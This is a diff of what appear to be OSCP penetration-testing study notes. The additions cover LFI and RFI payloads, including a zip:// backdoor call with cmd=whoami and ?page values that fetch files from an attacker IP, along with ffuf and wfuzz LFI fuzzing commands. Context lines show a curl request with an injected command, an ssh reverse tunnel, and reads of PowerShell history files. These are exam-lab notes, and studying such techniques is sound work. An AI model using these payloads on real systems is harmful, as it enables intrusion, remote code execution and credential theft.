@@ -951,7 +951,12 @@ ssh -N -R 9998 kali@192.168.118.4
 - View page/page sources
 - Local File Inclusion
   - Click stuff to find out if we can find this ?file, ?page
+  - ?page=C:/Windows/System32/drivers/etc/hosts
   - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami
+  - ![image](https://github.com/nuricheun/OSCP/assets/14031269/c57b4849-394f-4fa5-a173-9548b31e9c06)
+- Remote File Inclusion(RFI)
+  - ?page=http://192.168.45.208/test.txt
+
 - POST/GET with burp suite
 - Any .config, .conf files?
 - Combination with SQLi and other webpage that we know wehre its root location is
@@ -1012,10 +1017,22 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 - Make sure to check "important files" list
 - Make sure to see what files we can find using wfuzz on our current location
   - Make sure to check file extension(.py, .js, .conf, .config...)
+- Files to Check on windows
+  - C:/Windows/System32/drivers/etc/hosts
+- Files to check on linux
+  - ![image](https://github.com/nuricheun/OSCP/assets/14031269/6f634499-c15a-4424-adae-df9013031d02)
+
 ```bash
 # Local File Inclusion...
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
+
+# First run without -fl
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ -fl 5
 ```
+
+## Remote File Inclusion
+- ?page=http://192.168.45.208
 
 ## PHP File Upload Bypass
 ```bash
@@ -1247,7 +1264,6 @@ Get-History
   type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 C:\Users\Public\Transcript...
-
 ```
 
 ## Service Binary Hijacking
